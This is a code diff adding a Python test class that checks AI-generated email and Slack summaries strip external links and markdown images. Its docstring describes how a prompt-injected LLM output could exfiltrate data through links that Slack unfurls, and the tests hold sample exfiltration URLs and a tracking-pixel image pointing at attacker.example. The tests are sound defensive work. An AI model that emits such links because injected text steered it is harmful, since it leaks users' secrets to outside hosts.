@@ -54,6 +54,41 @@ class TestRenderAIEmailHtml:
         assert "<em>italic</em>" in html
 
 
+class TestExternalUrlExfilGuard:
+    """A prompt-injected synthesis could embed a link to attacker.example; Slack auto-unfurls
+    outbound links server-side, which is an exfil channel. External URLs and markdown images
+    must be stripped from delivered output regardless of how the LLM was steered."""
+
+    def test_email_strips_external_link_href_keeps_text(self) -> None:
+        html = render_ai_email_html("See [here](https://attacker.example/exfil?p=secret) for details.")
+        assert "attacker.example" not in html
+        assert "here" in html
+
+    def test_email_keeps_posthog_links(self) -> None:
+        html = render_ai_email_html("Open [the dashboard](https://app.posthog.com/insights/abc).")
+        assert "app.posthog.com/insights/abc" in html
+
+    def test_email_strips_markdown_images(self) -> None:
+        html = render_ai_email_html("Pixel: ![tracker](https://attacker.example/track.gif)")
+        assert "attacker.example" not in html
+        assert "<img" not in html
+
+    def test_slack_strips_external_link(self) -> None:
+        message = _build_ai_slack_message(
+            _mock_subscription(), "See [details](https://attacker.example/exfil?p=secret)"
+        )
+        all_text = " ".join(b["text"]["text"] for b in message.blocks if b["type"] == "section")
+        assert "attacker.example" not in all_text
+        assert "details" in all_text
+
+    def test_slack_keeps_posthog_link(self) -> None:
+        message = _build_ai_slack_message(
+            _mock_subscription(), "Open [dashboard](https://app.posthog.com/insights/abc)"
+        )
+        all_text = " ".join(b["text"]["text"] for b in message.blocks if b["type"] == "section")
+        assert "app.posthog.com/insights/abc" in all_text
+
+
 def _mock_subscription() -> MagicMock:
     sub = MagicMock()
     sub.target_value = "C123|#general"
